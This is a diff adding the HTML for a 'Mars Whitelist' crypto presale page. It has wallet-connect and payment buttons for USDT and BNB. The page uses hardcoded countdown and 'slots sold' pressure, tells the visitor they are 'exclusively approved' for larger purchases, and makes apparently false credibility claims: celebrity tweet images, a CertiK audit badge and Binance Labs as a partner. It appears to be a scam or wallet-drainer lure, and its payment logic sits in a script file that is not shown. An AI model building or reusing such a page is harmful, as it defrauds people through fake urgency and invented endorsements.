@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mars Whitelist</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+</head>
+<body>
+  <video autoplay muted loop id="marsVideo"><source src="mars_orbit.mp4" type="video/mp4"></video>
+  <audio autoplay loop volume="0.2"><source src="space_ambient.mp3" type="audio/mpeg"></audio>
+  <div id="particles-js"></div>
+  <header>
+    <img src="mars_logo.png" id="logo" alt="Mars Logo">
+    <nav>
+      <a href="#about">About</a>
+      <a href="#tokenomics">Tokenomics</a>
+      <a href="#audit">Audit</a>
+      <a href="#roadmap">Roadmap</a>
+      <a href="#partners">Partners</a>
+    </nav>
+    <a href="https://x.com/Marsgr0k" target="_blank" class="social-link">
+      <img src="x_logo.png" alt="X Logo" class="social-icon">
+    </a>
+    <div class="wallet-header">
+      <button id="connectButton">Connect Wallet</button>
+      <button id="disconnectButton" style="display: none;">Disconnect Wallet</button>
+      <div id="walletText"></div>
+      <div id="resultText"></div>
+    </div>
+  </header>
+  <section class="hero">
+    <div class="hero-content">
+      <div class="fomo">
+        <div id="slotsText">394/500 slots sold!</div>
+        <div id="countdownText">14 days left!</div>
+        <div class="fomo-message">
+          <h3>Only 106 slots left!</h3>
+          <p>Join the Mars whitelist now!</p>
+          <p class="whitelist-note">Whitelist for wallets that have purchased Grok coin and random lucky wallets.</p>
+        </div>
+      </div>
+      <div class="whitelist">
+        <div id="whitelistForm" style="display: none;">
+          <div id="exclusiveMessage" style="display: none; color: #FF4500; font-size: 18px; font-weight: 700; margin-bottom: 15px;">
+            Others are limited to $100, but you're exclusively approved for up to $2000!
+          </div>
+          <select id="amountDropdown">
+            <option value="100|USDT">100 USDT</option>
+            <option value="250|USDT">250 USDT</option>
+            <option value="500|USDT">500 USDT</option>
+            <option value="1000|USDT">1000 USDT</option>
+            <option value="1500|USDT">1500 USDT</option>
+            <option value="2000|USDT">2000 USDT</option>
+            <option value="1|BNB">1 BNB</option>
+            <option value="2|BNB">2 BNB</option>
+            <option value="3|BNB">3 BNB</option>
+          </select>
+          <button id="payButton" style="display: none;">Buy Whitelist</button>
+          <div id="notEligibleText" style="display: none; color: #FF4500; font-size: 18px; margin-top: 10px;">
+            You are not eligible for the whitelist
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <section class="content-section" id="about">
+    <h2>About Mars</h2>
+    <div class="content-grid about-grid">
+      <div class="content-item">
+        <img src="elon_tweet.png" alt="Elon Musk Tweet" class="about-image">
+        <p>Welcome to Mars, the ultimate sci-fi metaverse built on Web3 technology. Our mission is to create a decentralized, immersive universe where players, creators, and innovators can explore, build, and thrive on the red planet. Powered by blockchain, Mars integrates NFTs, decentralized gaming, and community-driven governance to redefine virtual experiences.</p>
+      </div>
+      <div class="content-item">
+        <img src="mars_backpack.png" alt="Mars Backpack" class="about-image">
+        <p>Our vision is to establish a borderless digital ecosystem where users can own, trade, and monetize their in-game assets with full transparency and security. From virtual land ownership to intergalactic adventures, Mars offers a futuristic playground for the next generation of digital pioneers.</p>
+      </div>
+      <div class="content-item">
+        <img src="cz_elon_tweet.png" alt="CZ and Elon Musk Tweet" class="about-image">
+        <p>Join us as we pioneer the future of gaming and virtual reality, one block at a time. Mars has garnered support from industry leaders, with endorsements highlighting its potential to revolutionize the space economy.</p>
+      </div>
+    </div>
+  </section>
+  <section class="content-section" id="tokenomics">
+    <h2>Tokenomics</h2>
+    <div class="content-grid tokenomics-grid">
+      <div class="content-item">
+        <div class="pie-chart">
+          <div class="pie-slice sale" style="--percentage: 35;"></div>
+          <div class="pie-slice team" style="--percentage: 15;"></div>
+          <div class="pie-slice ecosystem" style="--percentage: 30;"></div>
+          <div class="pie-slice liquidity" style="--percentage: 15;"></div>
+          <div class="pie-slice marketing" style="--percentage: 5;"></div>
+        </div>
+      </div>
+      <div class="content-item">
+        <h3>Token Distribution</h3>
+        <ul class="tokenomics-list">
+          <li><span class="tokenomics-label sale">35% - Sale:</span> Public and private sales to fund the project.</li>
+          <li><span class="tokenomics-label team">15% - Team:</span> Allocated to the core team, vested over 3 years.</li>
+          <li><span class="tokenomics-label ecosystem">30% - Ecosystem:</span>
+            <ul>
+              <li>10% - Staking Rewards: Incentivize long-term holders.</li>
+              <li>10% - Community Airdrop: Reward early adopters.</li>
+              <li>10% - Ecosystem Development: Build the Mars metaverse.</li>
+            </ul>
+          </li>
+          <li><span class="tokenomics-label liquidity">15% - Liquidity:</span> Ensure liquidity on CEX/DEX platforms.</li>
+          <li><span class="tokenomics-label marketing">5% - Marketing & Partnerships:</span> Drive growth and adoption.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+  <section class="content-section" id="audit">
+    <h2>Audit</h2>
+    <div class="content-grid audit-grid">
+      <div class="content-item audit-card">
+        <h3>CertiK Audit – March 2025</h3>
+        <p>Score: <span class="audit-score">98/100</span></p>
+        <p>Passed 100+ security checks with no critical vulnerabilities.</p>
+        <div class="audit-details">
+          <div class="audit-info">
+            <div class="audit-images">
+              <img src="certik_audit.png" alt="CertiK Audit Report" class="audit-image">
+              <img src="certik_additional.png" alt="CertiK Additional" class="audit-image">
+            </div>
+            <a href="mars_audit.html" target="_blank" class="audit-link">
+              <span class="audit-link-text">View Full Audit Report</span>
+            </a>
+          </div>
+          <div class="audit-logo-container">
+            <img src="certik_logo.png" alt="Audit by CertiK" class="audit-logo">
+            <span class="audit-badge">CertiK Verified</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <section class="content-section" id="roadmap">
+    <h2>Roadmap</h2>
+    <div class="roadmap-timeline">
+      <div class="roadmap-item">
+        <div class="roadmap-dot"></div>
+        <div class="roadmap-content">
+          <h3>Q1 2025</h3>
+          <ul>
+            <li>Official project launch</li>
+            <li>Private sale for early investors</li>
+            <li>Smart contract audit by CertiK</li>
+          </ul>
+        </div>
+      </div>
+      <div class="roadmap-item">
+        <div class="roadmap-dot"></div>
+        <div class="roadmap-content">
+          <h3>Q2 2025</h3>
+          <ul>
+            <li>Public sale on launchpad</li>
+            <li>Listing on DEX (PancakeSwap)</li>
+            <li>Community airdrop for early adopters</li>
+          </ul>
+        </div>
+      </div>
+      <div class="roadmap-item">
+        <div class="roadmap-dot"></div>
+        <div class="roadmap-content">
+          <h3>Q3 2025</h3>
+          <ul>
+            <li>Staking program for token holders</li>
+            <li>Beta launch of Mars metaverse</li>
+            <li>Partnerships with gaming guilds</li>
+          </ul>
+        </div>
+      </div>
+      <div class="roadmap-item">
+        <div class="roadmap-dot"></div>
+        <div class="roadmap-content">
+          <h3>Q4 2025</h3>
+          <ul>
+            <li>Full launch of Mars metaverse</li>
+            <li>Listing on CEX (Binance)</li>
+            <li>Expansion of strategic partnerships</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+  <section class="content-section" id="partners">
+    <h2>Strategic Partners</h2>
+    <div class="partner-logos">
+      <div class="partner-item">
+        <img src="galaxy_ventures.png" alt="Galaxy Ventures">
+      </div>
+      <div class="partner-item">
+        <img src="star_capital.png" alt="Star Capital">
+      </div>
+      <div class="partner-item">
+        <img src="moon_fund.png" alt="Moon Fund">
+      </div>
+      <div class="partner-item">
+        <img src="binance_labs.png" alt="Binance Labs">
+      </div>
+    </div>
+    <p>Backed by top-tier VCs in AI & blockchain</p>
+  </section>
+  <script src="script.js"></script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'930fceacccf9d640',t:'MTc0NDc2NTg3Mi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
+</body>
+</html>
